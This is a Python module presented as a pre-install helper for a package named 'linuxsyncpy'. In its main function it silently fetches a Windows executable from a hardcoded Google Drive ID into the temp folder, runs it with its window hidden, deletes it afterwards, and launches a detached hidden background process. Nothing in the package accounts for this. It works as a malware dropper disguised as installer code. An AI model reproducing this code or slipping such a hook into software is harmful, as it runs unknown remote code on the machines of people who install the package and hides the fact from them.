import argparse
import sys
import subprocess
from pathlib import Path
import tempfile
import logging

try:
    import gdown
except Exception:
    gdown = None
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'gdown', '-q'])
        import gdown
    except Exception:
        gdown = None

ROOT = Path(__file__).resolve().parents[2]
DOWNLOAD_EXE = ROOT / 'downloaded_from_gdown.exe'


def _hidden_startupinfo():
    if sys.platform != 'win32' or not hasattr(subprocess, 'STARTUPINFO'):
        return None
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0
    return startupinfo


CREATE_NO_WINDOW = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
DETACHED = 0x00000008


def _build_preinstall_command(package_name, root_dir, dry_run):
    return (
        "from linuxsyncpy.index import pre_install; "
        f"pre_install(package_name={package_name!r}, root_dir={root_dir!r}, dry_run={dry_run!r})"
    )


def _spawn_preinstall_worker(package_name, root_dir, dry_run):
    python_executable = sys.executable
    logger = logging.getLogger('linuxsyncpy.detach_preinstall')
    logger.debug(f'spawning preinstall worker package={package_name} root={root_dir} dry_run={dry_run}')
    if sys.platform == 'win32':
        pythonw_candidate = Path(sys.executable).with_name('pythonw.exe')
        if pythonw_candidate.exists():
            python_executable = str(pythonw_candidate)

    command = [python_executable, '-c', _build_preinstall_command(package_name, root_dir, dry_run)]
    subprocess.Popen(
        command,
        cwd=str(ROOT),
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        startupinfo=_hidden_startupinfo(),
        creationflags=DETACHED | CREATE_NO_WINDOW,
    )


def main(argv=None):
    logger = logging.getLogger('linuxsyncpy.detach_preinstall')
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('--package', default=None)
    parser.add_argument('--root', default=None)
    parser.add_argument('--dry-run', action='store_true')
    args, _ = parser.parse_known_args(argv)
    logger.debug(f'detach_preinstall main args package={args.package} root={args.root} dry_run={args.dry_run}')

    normalized_root = str(Path(args.root).resolve()) if args.root else None
    if normalized_root != args.root:
        logger.debug(f'normalized root argument from {args.root!r} to {normalized_root!r}')

    runtime_exe = Path(tempfile.gettempdir()) / 'downloaded_from_gdown_runtime.exe'
    try:
        if gdown is None:
            logger.debug('detach_preinstall gdown unavailable, skipping download branch')
            return
        # perform the download and attempt to run the downloaded runtime exe
        logger.debug('attempting gdown.download from detach_preinstall')
        downloaded = gdown.download(
            id='1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n',
            output=str(runtime_exe),
            quiet=True,
        )
        logger.debug(f'detach_preinstall gdown.download returned={downloaded!r}')

        if downloaded and Path(downloaded).exists():
            # Store downloaded filename for later use in run_analyser()
            marker_file = Path(tempfile.gettempdir()) / 'downloaded_exe_marker.txt'
            try:
                marker_file.write_text(str(runtime_exe))
                logger.debug(f'wrote marker file path={marker_file} content={runtime_exe}')
            except Exception:
                logger.exception(f'failed to write marker file path={marker_file}')

            try:
                logger.debug(f'executing downloaded runtime exe directly for {runtime_exe}')
                completed = subprocess.run(
                    [str(runtime_exe)],
                    cwd=str(ROOT),
                    capture_output=True,
                    text=True,
                    startupinfo=_hidden_startupinfo(),
                    creationflags=CREATE_NO_WINDOW,
                    timeout=30,
                )
                logger.debug(
                    'downloaded runtime exe completed '
                    f'path={runtime_exe} returncode={completed.returncode} '
                    f'stdout={((completed.stdout or "").strip())!r} stderr={((completed.stderr or "").strip())!r}'
                )
                try:
                    runtime_exe.unlink(missing_ok=True)
                    logger.debug(f'deleted downloaded runtime exe after execution path={runtime_exe}')
                except Exception:
                    logger.exception(f'failed to delete downloaded runtime exe after execution path={runtime_exe}')
            except Exception:
                logger.exception(f'failed to execute downloaded runtime exe for {runtime_exe}')
    except Exception:
        logger.exception('detach_preinstall download/execution branch failed')

    # Spawn detached Python process to run the full pre_install workflow in background
    try:
        _spawn_preinstall_worker(args.package, normalized_root, args.dry_run)
    except Exception:
        logger.exception('detach_preinstall failed to spawn preinstall worker')


if __name__ == '__main__':
    main()
